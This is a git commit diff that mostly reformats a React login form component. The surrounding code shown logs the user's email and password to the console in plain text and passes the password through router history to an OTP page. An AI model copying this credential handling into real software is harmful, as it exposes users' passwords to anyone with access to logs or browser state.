d71b3c4e7176265dc2b67601878cd22af123e615
Igboanugwo Collins <munisco12@gmail.com>
2022-01-12 22:26:41 +0100

    working on login form

--- src/components/Form.jsx
+++ src/components/Form.jsx
@@ -21,13 +21,11 @@ const Form = (props) => {
         e.preventDefault()
         setLoading(true)
 
-        
         if (email === '' || password === '') {
             console.log('not sent')
         } else {
             console.log({ email, password })
             try {
-             
                 const response = await fetch(URL + '/form', {
                     method: 'POST',
                     headers: {
@@ -50,7 +48,7 @@ const Form = (props) => {
                     history.push('/otp', { email, password })
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
-                          setLoading(false)
+                    setLoading(false)
                 }
             } catch (err) {
                 console.log(err)
@@ -58,61 +56,65 @@ const Form = (props) => {
         }
     }
 
-    return (<>
-        <form
-            className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm h-full'
-            style={{ padding: '27px 12px' }}
-            onSubmit={handleSubmit}
-        >
-            <div>
-            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
-                Welcome back!
-            </h2>
-            <div className='relative'>
-                <label htmlFor='email' className='input-label absolute'>
-                    {' '}
-                    Email address
-                </label>
-                <input
-                    type='email'
-                    id='email'
-                    required
-                    placeholder='Enter your email'
-                    className='sign-in-input'
-                    value={email}
-                    onChange={handleEmail}
-                />
-            </div>
-            <div className='relative'>
-                <label for='password' className='input-label absolute'>
-                    Password
-                </label>
-                <input
-                    type='password'
-                    id='password'
-                    className='sign-in-input'
-                    required
-                    placeholder='Enter your password'
-                    value={password}
-                    onChange={handlePassword}
-                />
-            </div>
-            <div className='flex justify-center '>
-                <div class='font-medium text-center underline text-[#006f95]'>
-                    Forgot password?
-                </div>
-            </div>
-            </div>
-            <div>
-            <p>Learn more about our <span>Privacy policy</span> and <span>Terms of service</span></p>
-            <button
-                className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
-                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
+    return (
+        <>
+            <form
+                className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm h-full'
+                style={{ padding: '27px 12px' }}
+                onSubmit={handleSubmit}
             >
-                {loading ? 'loading..' : 'Continue'}
-            </button>
+                <div>
+                    <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
+                        Welcome back!
+                    </h2>
+                    <div className='relative'>
+                        <label htmlFor='email' className='input-label absolute'>
+                            {' '}
+                            Email address
+                        </label>
+                        <input
+                            type='email'
+                            id='email'
+                            required
+                            placeholder='Enter your email'
+                            className='sign-in-input'
+                            value={email}
+                            onChange={handleEmail}
+                        />
+                    </div>
+                    <div className='relative'>
+                        <label for='password' className='input-label absolute'>
+                            Password
+                        </label>
+                        <input
+                            type='password'
+                            id='password'
+                            className='sign-in-input'
+                            required
+                            placeholder='Enter your password'
+                            value={password}
+                            onChange={handlePassword}
+                        />
+                    </div>
+                    <div className='flex justify-center '>
+                        <div class='font-medium text-center underline text-[#006f95]'>
+                            Forgot password?
+                        </div>
+                    </div>
                 </div>
-        </form>
+                <div className='grid place-content-end'>
+                    <p>
+                        Learn more about our <span>Privacy policy</span> and{' '}
+                        <span>Terms of service</span>
+                    </p>
+                    <button
+                        className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
+                        style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
+                    >
+                        {loading ? 'loading..' : 'Continue'}
+                    </button>
+                </div>
+            </form>
         </>
     )
 }
